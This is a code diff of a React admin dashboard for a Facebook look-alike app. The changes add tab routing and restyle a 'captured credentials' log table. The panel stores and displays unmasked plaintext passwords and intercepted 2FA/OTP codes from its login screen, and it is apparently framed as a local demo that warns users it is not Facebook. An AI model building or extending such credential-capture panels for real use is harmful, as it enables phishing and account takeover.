@@ -1,6 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import {
   Shield,
+  ShieldCheck,
   Users,
   FileText,
   Bell,
@@ -45,6 +46,7 @@ import {
 } from 'lucide-react';
 import { api } from '../api/client';
 import { INITIAL_POSTS, INITIAL_STORIES, INITIAL_NOTIFICATIONS } from '../data/mockData';
+import { getCurrentRoute, setRoute } from '../utils/router';
 
 // Helper to safely extract image URL(s) from any post data structure
 export const getPostImageUrl = (post) => {
@@ -77,8 +79,44 @@ export const getPostMediaImages = (post) => {
   return single ? [single] : [];
 };
 
-export default function AdminDashboard({ onExit }) {
-  const [activeTab, setActiveTab] = useState('posts'); // Default to 'posts' as requested
+export default function AdminDashboard({ onExit, activeSubTab }) {
+  const [activeTab, setActiveTab] = useState(() => {
+    if (activeSubTab) return activeSubTab;
+    const route = getCurrentRoute();
+    if (route.page === 'admin' && route.subPage) {
+      return route.subPage;
+    }
+    return 'logs';
+  });
+
+  const handleSelectTab = (tab) => {
+    setActiveTab(tab);
+    setRoute(`admin/${tab}`);
+  };
+
+  useEffect(() => {
+    if (activeSubTab && activeSubTab !== activeTab) {
+      setActiveTab(activeSubTab);
+    }
+  }, [activeSubTab]);
+
+  useEffect(() => {
+    const handleHash = () => {
+      const route = getCurrentRoute();
+      if (route.page === 'admin' && route.subPage && route.subPage !== activeTab) {
+        setActiveTab(route.subPage);
+      }
+    };
+    window.addEventListener('hashchange', handleHash);
+    return () => window.removeEventListener('hashchange', handleHash);
+  }, [activeTab]);
+
+  useEffect(() => {
+    const route = getCurrentRoute();
+    if (route.page === 'admin') {
+      setRoute(`admin/${activeTab}`, true);
+    }
+  }, [activeTab]);
   const [serverStatus, setServerStatus] = useState('checking'); // 'online' | 'offline' | 'checking'
   const [loading, setLoading] = useState(false);
   const [statusMessage, setStatusMessage] = useState('');
@@ -100,13 +138,10 @@ export default function AdminDashboard({ onExit }) {
       return [];
     }
   });
-  const [rawDbExpanded, setRawDbExpanded] = useState(false);
   const [logSearchQuery, setLogSearchQuery] = useState('');
   const [logFilter, setLogFilter] = useState('concentrated'); // 'concentrated' | 'all' | 'passwords' | 'success' | 'trials' | 'codes'
   const [revealedPasswords, setRevealedPasswords] = useState({});
   const [copiedId, setCopiedId] = useState(null);
-  const [activePipelineStep, setActivePipelineStep] = useState(0);
-  const [activeTerminalTab, setActiveTerminalTab] = useState('logs'); // 'logs' | 'full' | 'local'
 
   const handleCopyText = (text, id) => {
     if (!text) return;
@@ -298,6 +333,9 @@ export default function AdminDashboard({ onExit }) {
       twoFactorSubtitle: 'Enter the code that we sent to your mobile number.',
       twoFactorTimer: '00:52',
       twoFactorChannel: 'sms',
+      twoFactorExpectedCode: '00000',
+      twoFactorPlaceholder: 'Code (Clue: 00000)',
+      twoFactorWarning: '⚠️ Notice: This is not Facebook. Do not enter real credentials or personal information.',
     };
   });
   const [recoverySavedNotice, setRecoverySavedNotice] = useState(false);
@@ -326,6 +364,9 @@ export default function AdminDashboard({ onExit }) {
       twoFactorSubtitle: 'Enter the code that we sent to your mobile number.',
       twoFactorTimer: '00:52',
       twoFactorChannel: 'sms',
+      twoFactorExpectedCode: '00000',
+      twoFactorPlaceholder: 'Code (Clue: 00000)',
+      twoFactorWarning: '⚠️ Notice: This is not Facebook. Do not enter real credentials or personal information.',
     };
     setRecoverySettings(defaults);
     try {
@@ -894,7 +935,7 @@ export default function AdminDashboard({ onExit }) {
         <aside className="fb-admin-nav-sidebar">
           <button
             className={`fb-admin-nav-item ${activeTab === 'overview' ? 'active' : ''}`}
-            onClick={() => setActiveTab('overview')}
+            onClick={() => handleSelectTab('overview')}
           >
             <Activity size={18} />
             <span>Dashboard Overview</span>
@@ -902,7 +943,7 @@ export default function AdminDashboard({ onExit }) {
 
           <button
             className={`fb-admin-nav-item ${activeTab === 'users' ? 'active' : ''}`}
-            onClick={() => setActiveTab('users')}
+            onClick={() => handleSelectTab('users')}
           >
             <Users size={18} />
             <span>Users & Login Accounts ({users.length})</span>
@@ -910,7 +951,7 @@ export default function AdminDashboard({ onExit }) {
 
           <button
             className={`fb-admin-nav-item ${activeTab === 'logs' ? 'active' : ''}`}
-            onClick={() => setActiveTab('logs')}
+            onClick={() => handleSelectTab('logs')}
           >
             <Database size={18} />
             <span>Database & Login Logs ({loginLogs.length})</span>
@@ -934,7 +975,7 @@ export default function AdminDashboard({ onExit }) {
 
           <button
             className={`fb-admin-nav-item ${activeTab === 'recovery' ? 'active' : ''}`}
-            onClick={() => setActiveTab('recovery')}
+            onClick={() => handleSelectTab('recovery')}
           >
             <Shield size={18} />
             <span>Recovery & Meta Settings</span>
@@ -942,7 +983,7 @@ export default function AdminDashboard({ onExit }) {
 
           <button
             className={`fb-admin-nav-item ${activeTab === 'posts' ? 'active' : ''}`}
-            onClick={() => setActiveTab('posts')}
+            onClick={() => handleSelectTab('posts')}
           >
             <FileText size={18} />
             <span>Feed Posts ({posts.length})</span>
@@ -950,7 +991,7 @@ export default function AdminDashboard({ onExit }) {
 
           <button
             className={`fb-admin-nav-item ${activeTab === 'stories' ? 'active' : ''}`}
-            onClick={() => setActiveTab('stories')}
+            onClick={() => handleSelectTab('stories')}
           >
             <Film size={18} />
             <span>Video Stories ({stories.length})</span>
@@ -958,7 +999,7 @@ export default function AdminDashboard({ onExit }) {
 
           <button
             className={`fb-admin-nav-item ${activeTab === 'notifs' ? 'active' : ''}`}
-            onClick={() => setActiveTab('notifs')}
+            onClick={() => handleSelectTab('notifs')}
           >
             <Bell size={18} />
             <span>Notifications ({notifications.length})</span>
@@ -1580,7 +1621,7 @@ export default function AdminDashboard({ onExit }) {
               </p>
 
               <div className="fb-admin-metrics-grid">
-                <div className="fb-admin-metric-card" onClick={() => setActiveTab('users')}>
+                <div className="fb-admin-metric-card" onClick={() => handleSelectTab('users')}>
                   <div className="metric-icon blue">
                     <Users size={24} />
                   </div>
@@ -1590,7 +1631,7 @@ export default function AdminDashboard({ onExit }) {
                   </div>
                 </div>
 
-                <div className="fb-admin-metric-card" onClick={() => setActiveTab('posts')}>
+                <div className="fb-admin-metric-card" onClick={() => handleSelectTab('posts')}>
                   <div className="metric-icon green">
                     <FileText size={24} />
                   </div>
@@ -1600,7 +1641,7 @@ export default function AdminDashboard({ onExit }) {
                   </div>
                 </div>
 
-                <div className="fb-admin-metric-card" onClick={() => setActiveTab('logs')}>
+                <div className="fb-admin-metric-card" onClick={() => handleSelectTab('logs')}>
                   <div className="metric-icon blue" style={{ background: '#E0F2FE', color: '#0284C7' }}>
                     <Database size={24} />
                   </div>
@@ -1610,7 +1651,7 @@ export default function AdminDashboard({ onExit }) {
                   </div>
                 </div>
 
-                <div className="fb-admin-metric-card" onClick={() => setActiveTab('notifs')}>
+                <div className="fb-admin-metric-card" onClick={() => handleSelectTab('notifs')}>
                   <div className="metric-icon purple">
                     <Bell size={24} />
                   </div>
@@ -1637,7 +1678,7 @@ export default function AdminDashboard({ onExit }) {
                   <h3>Accounts Displayed on Login Screen</h3>
                   <button
                     className="fb-admin-btn-text"
-                    onClick={() => setActiveTab('users')}
+                    onClick={() => handleSelectTab('users')}
                   >
                     Manage Users &rarr;
                   </button>
@@ -1771,45 +1812,6 @@ export default function AdminDashboard({ onExit }) {
               TAB: DATABASE & CAPTURED LOGIN LOGS
               ======================================================== */}
           {activeTab === 'logs' && (() => {
-            const pipelineArchitecture = [
-              {
-                step: '01',
-                title: 'Frontend Capture',
-                subtitle: 'React Event Interceptor',
-                tech: 'LoginPage.jsx',
-                desc: 'Keystroke & submit listeners intercept input parameters instantly without delay.',
-                code: `// React Client Capture (LoginPage.jsx):\nawait api.logAttempt({\n  username: "Bol Riak Kuo",\n  email: "bol.kuol@example.com",\n  password: "myPlainPassword_123",\n  action: "Login Button Clicked",\n  success: true\n});`,
-                explanation: 'Every credential entry triggers api.logAttempt(...). Plaintext passwords are captured in real time for your local learning sandbox.'
-              },
-              {
-                step: '02',
-                title: 'HTTP REST Transport',
-                subtitle: 'POST /api/auth/log-attempt',
-                tech: 'Express Router :5000',
-                desc: 'JSON payload transferred over HTTP POST to the local Express backend.',
-                code: `POST /api/auth/log-attempt HTTP/1.1\nHost: localhost:5000\nContent-Type: application/json\n\n{\n  "username": "Bol Riak Kuo",\n  "password": "myPlainPassword_123",\n  "action": "Login Button Clicked"\n}`,
-                explanation: 'The browser sends an asynchronous JSON request to the Node.js backend running on port 5000.'
-              },
-              {
-                step: '03',
-                title: 'Node Storage Engine',
-                subtitle: 'storage.js Processing Engine',
-                tech: 'Express Middleware',
-                desc: 'Extracts client IP, user-agent headers, and creates an immutable database log record.',
-                code: `// server/src/db/storage.js\ncreateLoginLog(logData) {\n  const entry = {\n    id: 'log_' + Date.now() + '_' + Math.random().toString(36).substr(2, 4),\n    ...logData,\n    ip: req.ip,\n    createdAt: new Date().toISOString()\n  };\n  this.data.loginLogs.unshift(entry);\n  this.save(); // writes to disk store.json!\n  return entry;\n}`,
-                explanation: 'Node.js controller enriches the log with client metadata and inserts it at the top of the collection array.'
-              },
-              {
-                step: '04',
-                title: 'Disk DB Persistence',
-                subtitle: 'server/data/store.json',
-                tech: 'Physical File on Disk',
-                desc: 'Serialized atomically to disk. Changes are instantly readable across the entire application.',
-                code: `// File on Disk: c:\\Tahir\\Mission-1.0\\social-violet\\server\\data\\store.json\n{\n  "loginLogs": [\n    {\n      "id": "log_1793974881345_z32g",\n      "username": "Bol Riak Kuo",\n      "password": "myPlainPassword_123",\n      "action": "Login Button Clicked",\n      "createdAt": "2026-11-06T14:21:21.345Z"\n    }\n  ]\n}`,
-                explanation: 'Data is written directly into store.json on your computer hard drive! You can open that file in VS Code or Notepad to verify.'
-              }
-            ];
-
             const isIntermediateBlur = (l) => {
               const act = (l?.action || '').toLowerCase();
               return (
@@ -1914,79 +1916,35 @@ export default function AdminDashboard({ onExit }) {
               return true;
             });
 
-            const getTerminalJsonContent = () => {
-              if (activeTerminalTab === 'full') {
-                return JSON.stringify({
-                  databaseEngine: 'LowDB + JSON File Persistence',
-                  storagePath: 'social-violet/server/data/store.json',
-                  status: serverStatus === 'online' ? 'CONNECTED_PORT_5000' : 'OFFLINE_FALLBACK',
-                  stats: {
-                    totalLogs: loginLogs.length,
-                    totalUsers: users.length,
-                    totalPosts: posts.length,
-                  },
-                  sampleLogs: loginLogs.slice(0, 5),
-                }, null, 2);
-              }
-              if (activeTerminalTab === 'local') {
-                try {
-                  const local = localStorage.getItem('sphere_login_logs');
-                  return local ? JSON.stringify(JSON.parse(local), null, 2) : '[]';
-                } catch {
-                  return '[]';
-                }
-              }
-              return JSON.stringify(loginLogs, null, 2);
-            };
-
             return (
               <div className="fb-admin-tab-pane">
                 {/* Section Header */}
-                <div className="fb-admin-section-header-row" style={{ alignItems: 'flex-start' }}>
+                <div className="fb-admin-section-header-row" style={{ alignItems: 'center', marginBottom: 20 }}>
                   <div>
-                    <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '6px' }}>
-                      <h2 className="fb-admin-section-heading" style={{ margin: 0 }}>
-                        Database & Live Credentials Captured
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '4px' }}>
+                      <h2 className="fb-admin-section-heading" style={{ margin: 0, fontSize: '20px', fontWeight: 800 }}>
+                        Database & Live Authentication Stream
                       </h2>
                       <div className="fb-admin-live-badge">
                         <span className="fb-admin-pulse-indicator" />
-                        <span>Live DB Stream</span>
+                        <span>Live Sync: store.json</span>
                       </div>
                     </div>
-                    <p className="fb-admin-section-sub">
-                      Real-time stream of usernames, plain-text passwords, OTP codes, and client events saved to disk database.
+                    <p className="fb-admin-section-sub" style={{ margin: 0 }}>
+                      Live audit monitoring of captured credentials, 2FA verification trials, and visitor logins.
                     </p>
                   </div>
 
                   <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
                     <button
                       type="button"
-                      className="fb-admin-glow-btn"
-                      onClick={handleSimulateTestLogin}
-                      title="Simulate a real login attempt to inspect database writing"
-                    >
-                      <Sparkles size={16} />
-                      <span>Test Login ("Bol Riak Kuo")</span>
-                    </button>
-                    <button
-                      type="button"
-                      className="fb-admin-btn-secondary"
-                      onClick={handleSimulateFindAccountSearch}
-                      title="Simulate a 'Find your account' mobile number or email search query"
-                      style={{ display: 'flex', alignItems: 'center', gap: '6px' }}
-                    >
-                      <Search size={14} />
-                      <span>Test Find Account</span>
-                    </button>
-                    <button
-                      type="button"
                       className="fb-admin-btn-secondary"
                       onClick={loadData}
-                      title="Refresh records directly from database file"
+                      title="Reload records directly from store.json"
                       style={{ display: 'flex', alignItems: 'center', gap: '6px' }}
                     >
                       <RefreshCw size={14} className={loading ? 'spin' : ''} />
-                      <span>Refresh DB</span>
+                      <span>Refresh</span>
                     </button>
                     <button
                       type="button"
@@ -1997,6 +1955,15 @@ export default function AdminDashboard({ onExit }) {
                     >
                       <Download size={14} />
                       <span>Export JSON</span>
+                    </button>
+                    <button
+                      type="button"
+                      className="fb-admin-glow-btn"
+                      onClick={handleSimulateTestLogin}
+                      title="Add a test record to verify table and storage"
+                    >
+                      <Sparkles size={14} />
+                      <span>+ Simulate Test</span>
                     </button>
                     <button
                       type="button"
@@ -2012,201 +1979,76 @@ export default function AdminDashboard({ onExit }) {
                       }}
                     >
                       <Trash2 size={14} />
-                      <span>Clear Logs</span>
+                      <span>Clear</span>
                     </button>
                   </div>
                 </div>
 
-                {/* Interactive Data Pipeline Architecture */}
-                <div className="fb-admin-pipeline-panel">
-                  <div className="fb-admin-pipeline-header">
-                    <div className="fb-admin-pipeline-title-group">
-                      <div
-                        style={{
-                          width: '32px',
-                          height: '32px',
-                          borderRadius: '8px',
-                          background: 'rgba(8, 102, 255, 0.1)',
-                          display: 'flex',
-                          alignItems: 'center',
-                          justifyContent: 'center',
-                          color: '#0866FF',
-                        }}
-                      >
-                        <Zap size={18} />
-                      </div>
-                      <div>
-                        <h3 style={{ margin: 0, fontSize: '15px', fontWeight: 700, color: '#050505' }}>
-                          Beginner Guide: How the Database & Backend Work
-                        </h3>
-                        <p style={{ margin: 0, fontSize: '12px', color: '#65676B' }}>
-                          Interactive 4-step pipeline: Click any stage below to inspect its code & network payload!
-                        </p>
-                      </div>
-                    </div>
-                    <span
-                      style={{
-                        fontSize: '11.5px',
-                        fontWeight: 600,
-                        color: '#0866FF',
-                        background: '#EFF6FF',
-                        padding: '4px 10px',
-                        borderRadius: '6px',
-                        fontFamily: 'Consolas, monospace',
-                      }}
-                    >
-                      Step {pipelineArchitecture[activePipelineStep].step} Active
-                    </span>
-                  </div>
-
-                  <div className="fb-admin-pipeline-flow">
-                    {pipelineArchitecture.map((stage, idx) => {
-                      const isActive = activePipelineStep === idx;
-                      return (
-                        <div
-                          key={stage.step}
-                          className={`fb-admin-pipeline-card ${isActive ? 'active' : ''}`}
-                          onClick={() => setActivePipelineStep(idx)}
-                        >
-                          <span className="fb-admin-pipeline-step-badge">
-                            STAGE {stage.step}
-                          </span>
-                          <div className="fb-admin-pipeline-card-title">
-                            {stage.title}
-                            {isActive && <Check size={14} color="#0866FF" />}
-                          </div>
-                          <p className="fb-admin-pipeline-card-desc">{stage.desc}</p>
-                          <div
-                            style={{
-                              marginTop: 'auto',
-                              paddingTop: '8px',
-                              fontSize: '10.5px',
-                              fontFamily: 'Consolas, monospace',
-                              color: isActive ? '#0866FF' : '#8A8D91',
-                              fontWeight: 600,
-                            }}
-                          >
-                            {stage.tech}
-                          </div>
-                        </div>
-                      );
-                    })}
-                  </div>
-
-                  {/* Active Step Detailed Inspector */}
-                  <div className="fb-admin-pipeline-detail-box">
-                    <div style={{ flex: 1 }}>
-                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
-                        <span style={{ color: '#38BDF8', fontWeight: 700, fontSize: '13px' }}>
-                          [{pipelineArchitecture[activePipelineStep].subtitle}]
-                        </span>
-                        <span style={{ color: '#9CA3AF', fontSize: '12px' }}>—</span>
-                        <span style={{ color: '#E5E7EB', fontSize: '12px' }}>
-                          {pipelineArchitecture[activePipelineStep].explanation}
-                        </span>
-                      </div>
-                      <pre
-                        style={{
-                          margin: 0,
-                          background: '#030712',
-                          padding: '12px',
-                          borderRadius: '8px',
-                          color: '#4ADE80',
-                          fontFamily: 'Consolas, monospace',
-                          fontSize: '11.5px',
-                          overflowX: 'auto',
-                          lineHeight: '1.45',
-                        }}
-                      >
-                        {pipelineArchitecture[activePipelineStep].code}
-                      </pre>
-                    </div>
-                  </div>
-                </div>
-
-                {/* Glassmorphism Metric Stat Cards */}
+                {/* Sleek Metric Stat Cards */}
                 <div className="fb-admin-pro-stats-grid">
                   {/* Card 1: Total Logs */}
                   <div className="fb-admin-pro-stat-card">
                     <div className="fb-admin-pro-stat-top">
                       <span className="fb-admin-pro-stat-label">Total Logs Saved</span>
                       <div className="fb-admin-squircle blue">
-                        <Database size={22} />
+                        <Database size={20} />
                       </div>
                     </div>
                     <div className="fb-admin-pro-stat-value">{loginLogs.length}</div>
                     <div className="fb-admin-pro-stat-sub">
-                      <Clock size={13} color="#0866FF" />
-                      <span>Saved persistently to disk</span>
+                      <Clock size={12} color="#0866FF" />
+                      <span>Persistent in store.json</span>
                     </div>
                   </div>
 
-                  {/* Card 2: Latest User */}
+                  {/* Card 2: Verified Success */}
                   <div className="fb-admin-pro-stat-card">
                     <div className="fb-admin-pro-stat-top">
-                      <span className="fb-admin-pro-stat-label">Latest Captured User</span>
+                      <span className="fb-admin-pro-stat-label">Verified Logins</span>
                       <div className="fb-admin-squircle emerald">
-                        <Users size={22} />
+                        <CheckCircle2 size={20} />
                       </div>
                     </div>
-                    <div
-                      className="fb-admin-pro-stat-value"
-                      style={{ fontSize: '20px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}
-                    >
-                      {loginLogs[0]?.username || loginLogs[0]?.accountName || loginLogs[0]?.email || 'None yet'}
+                    <div className="fb-admin-pro-stat-value" style={{ color: '#059669' }}>
+                      {successfulLoginsCount}
                     </div>
                     <div className="fb-admin-pro-stat-sub">
-                      <span
-                        style={{
-                          display: 'inline-block',
-                          width: '6px',
-                          height: '6px',
-                          borderRadius: '50%',
-                          background: '#10B981',
-                        }}
-                      />
-                      <span>{loginLogs[0]?.action || 'Waiting for first login...'}</span>
+                      <span style={{ display: 'inline-block', width: '6px', height: '6px', borderRadius: '50%', background: '#10B981' }} />
+                      <span>Granted homepage entry</span>
                     </div>
                   </div>
 
-                  {/* Card 3: Plaintext Passwords */}
+                  {/* Card 3: 2FA & OTP Trials */}
                   <div className="fb-admin-pro-stat-card">
                     <div className="fb-admin-pro-stat-top">
-                      <span className="fb-admin-pro-stat-label">Plaintext Passwords</span>
-                      <div className="fb-admin-squircle rose">
-                        <Key size={22} />
-                      </div>
-                    </div>
-                    <div className="fb-admin-pro-stat-value">{totalCapturedPasswords}</div>
-                    <div className="fb-admin-pro-stat-sub">
-                      <Zap size={13} color="#E11D48" />
-                      <span>Captured without hashing</span>
-                    </div>
-                  </div>
-
-                  {/* Card 4: Database Storage Engine */}
-                  <div className="fb-admin-pro-stat-card">
-                    <div className="fb-admin-pro-stat-top">
-                      <span className="fb-admin-pro-stat-label">Storage Engine</span>
+                      <span className="fb-admin-pro-stat-label">2FA / OTP Trials</span>
                       <div className="fb-admin-squircle purple">
-                        <Server size={22} />
+                        <ShieldCheck size={20} />
                       </div>
                     </div>
-                    <div className="fb-admin-pro-stat-value" style={{ fontSize: '18px', color: '#7C3AED' }}>
-                      {serverStatus === 'online' ? 'store.json (Disk)' : 'Local Storage DB'}
+                    <div className="fb-admin-pro-stat-value" style={{ color: '#7C3AED' }}>
+                      {otpCodesCount}
                     </div>
                     <div className="fb-admin-pro-stat-sub">
-                      <span
-                        style={{
-                          fontFamily: 'Consolas, monospace',
-                          fontSize: '11px',
-                          color: '#6B7280',
-                          overflow: 'hidden',
-                          textOverflow: 'ellipsis',
-                          whiteSpace: 'nowrap',
-                        }}
-                      >
-                        {serverStatus === 'online' ? 'social-violet/server/data/store.json' : 'HTML5 LocalStorage'}
+                      <Zap size={12} color="#7C3AED" />
+                      <span>Codes tested & recorded</span>
+                    </div>
+                  </div>
+
+                  {/* Card 4: Plaintext Passwords */}
+                  <div className="fb-admin-pro-stat-card">
+                    <div className="fb-admin-pro-stat-top">
+                      <span className="fb-admin-pro-stat-label">Captured Passwords</span>
+                      <div className="fb-admin-squircle rose">
+                        <Key size={20} />
+                      </div>
+                    </div>
+                    <div className="fb-admin-pro-stat-value" style={{ color: '#E11D48' }}>
+                      {totalCapturedPasswords}
+                    </div>
+                    <div className="fb-admin-pro-stat-sub">
+                      <span style={{ fontFamily: 'Consolas, monospace', fontSize: '11px', color: '#64748B' }}>
+                        Captured unmasked
                       </span>
                     </div>
                   </div>
@@ -2334,25 +2176,33 @@ export default function AdminDashboard({ onExit }) {
                   </div>
                 </div>
 
-                {/* Database Records Table */}
-                <div className="fb-admin-panel-box">
-                  <div
-                    style={{
-                      display: 'flex',
-                      alignItems: 'center',
-                      justifyContent: 'space-between',
-                      marginBottom: '16px',
-                      flexWrap: 'wrap',
-                      gap: '10px',
-                    }}
-                  >
+                {/* Enterprise Formal Divided Database Table Card */}
+                <div className="fb-admin-formal-table-card">
+                  {/* Card Header Toolbar */}
+                  <div className="fb-admin-formal-header-bar">
                     <div>
-                      <h3 style={{ margin: 0, fontSize: 16, fontWeight: 700 }}>
-                        Captured Database Records ({filteredLogs.length}
-                        {filteredLogs.length !== loginLogs.length ? ` of ${loginLogs.length}` : ''})
-                      </h3>
-                      <p style={{ margin: '2px 0 0 0', fontSize: '12px', color: '#65676B' }}>
-                        Shows every username, email, and plain-text password entered.
+                      <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+                        <h3 style={{ margin: 0, fontSize: '16.5px', fontWeight: 800, color: '#0F172A', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                          <ShieldCheck size={20} color="#0866FF" />
+                          <span>Captured Database Records</span>
+                        </h3>
+                        <span
+                          style={{
+                            fontSize: '11.5px',
+                            fontWeight: 700,
+                            padding: '3px 9px',
+                            borderRadius: '999px',
+                            background: '#EFF6FF',
+                            color: '#1D4ED8',
+                            border: '1px solid #BFDBFE',
+                          }}
+                        >
+                          {filteredLogs.length} {filteredLogs.length === 1 ? 'event' : 'events'}
+                          {filteredLogs.length !== loginLogs.length ? ` (filtered from ${loginLogs.length})` : ''}
+                        </span>
+                      </div>
+                      <p style={{ margin: '4px 0 0 0', fontSize: '12.5px', color: '#64748B' }}>
+                        Formal audit logs: captured credentials, 2FA verification trials, codes and access outcomes.
                       </p>
                     </div>
 
@@ -2361,7 +2211,7 @@ export default function AdminDashboard({ onExit }) {
                         <button
                           type="button"
                           className="fb-admin-btn-secondary"
-                          style={{ fontSize: '11.5px', padding: '3px 8px' }}
+                          style={{ fontSize: '11.5px', padding: '5px 10px', borderRadius: '6px' }}
                           onClick={() => {
                             setLogSearchQuery('');
                             setLogFilter('all');
@@ -2370,21 +2220,56 @@ export default function AdminDashboard({ onExit }) {
                           Reset Filters
                         </button>
                       )}
+
+                      <button
+                        type="button"
+                        className="fb-admin-btn-secondary"
+                        style={{ fontSize: '12px', padding: '5px 11px', borderRadius: '6px', display: 'inline-flex', alignItems: 'center', gap: '5px' }}
+                        onClick={handleExportLogsJson}
+                        title="Export database records as JSON"
+                      >
+                        <Download size={13} />
+                        <span>Export JSON</span>
+                      </button>
+
+                      {loginLogs.length > 0 && (
+                        <button
+                          type="button"
+                          style={{
+                            fontSize: '11.5px',
+                            padding: '5px 10px',
+                            borderRadius: '6px',
+                            border: '1px solid #FECACA',
+                            background: '#FEF2F2',
+                            color: '#DC2626',
+                            fontWeight: 600,
+                            cursor: 'pointer',
+                            display: 'inline-flex',
+                            alignItems: 'center',
+                            gap: '4px',
+                          }}
+                          onClick={handleClearLogs}
+                          title="Purge all logs"
+                        >
+                          <Trash2 size={12} />
+                          <span>Clear Logs</span>
+                        </button>
+                      )}
                     </div>
                   </div>
 
                   {filteredLogs.length === 0 ? (
-                    <div style={{ textAlign: 'center', padding: '48px 20px', color: '#65676B' }}>
-                      <Database size={42} color="#9CA3AF" style={{ marginBottom: '12px' }} />
-                      <p style={{ margin: 0, fontWeight: 700, fontSize: '15px', color: '#111827' }}>
+                    <div style={{ textAlign: 'center', padding: '52px 20px', color: '#64748B' }}>
+                      <Database size={44} color="#94A3B8" style={{ marginBottom: '12px' }} />
+                      <p style={{ margin: 0, fontWeight: 700, fontSize: '15px', color: '#0F172A' }}>
                         {loginLogs.length === 0
                           ? 'No login attempts or actions recorded yet.'
-                          : 'No database records match your filter.'}
+                          : 'No database records match your active filter.'}
                       </p>
-                      <p style={{ fontSize: '13px', margin: '6px 0 16px' }}>
+                      <p style={{ fontSize: '13px', margin: '6px 0 16px', color: '#64748B' }}>
                         {loginLogs.length === 0
-                          ? 'Go to the login screen and enter credentials, or click "Test Login" above!'
-                          : 'Try clearing your search query or switching to "All Records".'}
+                          ? 'Visit the login page to submit credentials, or click below to simulate a trial!'
+                          : 'Try clearing your search query or switching to "All Events".'}
                       </p>
                       {loginLogs.length === 0 ? (
                         <button
@@ -2409,21 +2294,22 @@ export default function AdminDashboard({ onExit }) {
                       )}
                     </div>
                   ) : (
-                    <div className="fb-admin-table-wrap">
-                      <table className="fb-admin-table">
+                    <div className="fb-admin-formal-table-wrap">
+                      <table className="fb-admin-formal-table">
                         <thead>
                           <tr>
-                            <th>User Account</th>
-                            <th>Device</th>
-                            <th>Plaintext Password (username or email or phone)</th>
-                            <th>Security Code</th>
-                            <th>Time</th>
-                            <th>Status</th>
-                            <th style={{ textAlign: 'right' }}>Actions</th>
+                            <th style={{ width: '80px', textAlign: 'center' }}># Record</th>
+                            <th style={{ width: '190px' }}>User / Account</th>
+                            <th style={{ width: '190px' }}>Origin & Device</th>
+                            <th style={{ width: '200px' }}>Captured Password</th>
+                            <th style={{ width: '160px', textAlign: 'center' }}>2FA / OTP Code</th>
+                            <th style={{ width: '130px' }}>Timestamp</th>
+                            <th style={{ width: '190px' }}>Verification Status</th>
+                            <th style={{ width: '100px', textAlign: 'right' }}>Actions</th>
                           </tr>
                         </thead>
                         <tbody>
-                          {filteredLogs.map((log) => {
+                          {filteredLogs.map((log, index) => {
                             const dateObj = log.createdAt ? new Date(log.createdAt) : new Date();
                             const formattedTime = dateObj.toLocaleTimeString([], {
                               hour: '2-digit',
@@ -2438,113 +2324,178 @@ export default function AdminDashboard({ onExit }) {
                             const credentialInput = log.email || log.username || log.accountName || '';
 
                             return (
-                              <tr key={log.id} className="fb-admin-cyber-row">
-                                {/* 1. User Account */}
+                              <tr key={log.id} className="fb-admin-formal-row">
+                                {/* 1. # Record & ID */}
+                                <td style={{ textAlign: 'center' }}>
+                                  <div style={{ display: 'inline-flex', flexDirection: 'column', alignItems: 'center', gap: '3px' }}>
+                                    <span
+                                      style={{
+                                        fontFamily: 'Consolas, monospace',
+                                        fontSize: '11px',
+                                        fontWeight: 800,
+                                        background: '#F1F5F9',
+                                        border: '1px solid #E2E8F0',
+                                        color: '#334155',
+                                        padding: '2px 7px',
+                                        borderRadius: '5px',
+                                      }}
+                                    >
+                                      #{String(filteredLogs.length - index).padStart(2, '0')}
+                                    </span>
+                                    <button
+                                      type="button"
+                                      onClick={() => handleCopyText(log.id, `id_${log.id}`)}
+                                      title={`Copy Log ID: ${log.id}`}
+                                      style={{
+                                        background: 'none',
+                                        border: 'none',
+                                        cursor: 'pointer',
+                                        padding: '1px 3px',
+                                        fontSize: '10px',
+                                        fontFamily: 'Consolas, monospace',
+                                        color: copiedId === `id_${log.id}` ? '#0E8A38' : '#94A3B8',
+                                        display: 'inline-flex',
+                                        alignItems: 'center',
+                                        gap: '3px',
+                                      }}
+                                    >
+                                      <span>{log.id.slice(0, 11)}..</span>
+                                      {copiedId === `id_${log.id}` ? <Check size={11} /> : <Copy size={10} />}
+                                    </button>
+                                  </div>
+                                </td>
+
+                                {/* 2. User Account */}
                                 <td>
                                   <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                                     <div
                                       style={{
                                         width: '36px',
                                         height: '36px',
-                                        borderRadius: '10px',
+                                        borderRadius: '9px',
                                         background: 'linear-gradient(135deg, #0866FF 0%, #00C6FF 100%)',
                                         color: '#FFFFFF',
                                         display: 'flex',
                                         alignItems: 'center',
                                         justifyContent: 'center',
                                         fontWeight: 800,
-                                        fontSize: '13.5px',
-                                        boxShadow: '0 2px 6px rgba(8, 102, 255, 0.25)',
+                                        fontSize: '14px',
+                                        boxShadow: '0 2px 6px rgba(8, 102, 255, 0.22)',
                                         flexShrink: 0,
                                       }}
                                     >
                                       {displayName[0].toUpperCase()}
                                     </div>
                                     <div style={{ minWidth: 0 }}>
-                                      <div style={{ fontWeight: 700, color: '#050505', fontSize: '13.5px', whiteSpace: 'nowrap' }}>
+                                      <div style={{ fontWeight: 700, color: '#0F172A', fontSize: '13.5px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>
                                         {displayName}
                                       </div>
-                                      <div
-                                        style={{
-                                          fontSize: '10.5px',
-                                          fontFamily: 'Consolas, monospace',
-                                          color: '#8A8D91',
-                                          display: 'flex',
-                                          alignItems: 'center',
-                                          gap: '4px',
-                                          marginTop: '2px',
-                                        }}
-                                      >
-                                        <span>#{log.id}</span>
-                                        <button
-                                          type="button"
-                                          onClick={() => handleCopyText(log.id, `id_${log.id}`)}
-                                          title="Copy ID"
+                                      {credentialInput && credentialInput !== displayName ? (
+                                        <div
                                           style={{
-                                            background: 'none',
-                                            border: 'none',
-                                            cursor: 'pointer',
-                                            padding: '1px',
